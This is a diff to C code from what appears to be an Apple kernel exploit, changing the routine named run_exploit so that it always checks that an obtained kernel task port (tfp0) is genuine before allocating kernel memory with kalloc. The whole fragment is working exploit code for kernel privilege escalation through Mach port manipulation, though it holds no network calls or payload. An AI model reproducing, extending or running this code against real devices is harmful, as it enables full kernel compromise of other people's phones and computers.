@@ -187,18 +187,16 @@ int run_exploit(void) {
 
     mach_port_deallocate(mach_task_self(), ool_port);
     free(msg);
+    
     if (!MACH_PORT_VALID(kinfo->tfp0)) goto done;
+    natural_t type = 0;
+    mach_vm_address_t addr = 0;
+    pid_t pid = -1;
 
-    if (kinfo->version[0] >= 5) {
-        natural_t type = 0;
-        mach_vm_address_t addr = 0;
-        pid_t pid = -1;
-
-        mach_port_kobject(mach_task_self(), kinfo->tfp0, &type, &addr);
-        pid_for_task(kinfo->tfp0, &pid);
-        if (type != IKOT_TASK || pid != 0) goto done;
-    }
-
+    mach_port_kobject(mach_task_self(), kinfo->tfp0, &type, &addr);
+    pid_for_task(kinfo->tfp0, &pid);
+    if (type != IKOT_TASK || pid != 0) goto done;
+    
     uint32_t test_alloc = kalloc(0x1000);
     if (test_alloc == 0) goto done;
     
